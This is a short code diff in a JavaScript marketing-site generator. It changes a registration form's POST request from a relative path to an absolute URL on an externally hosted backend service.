@@ -359,7 +359,7 @@ export function generateMarketingSite() {
             };
             
             try {
-                const response = await fetch('/saas/v2/register', {
+                const response = await fetch('https://service-s816.onrender.com/saas/v2/register', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
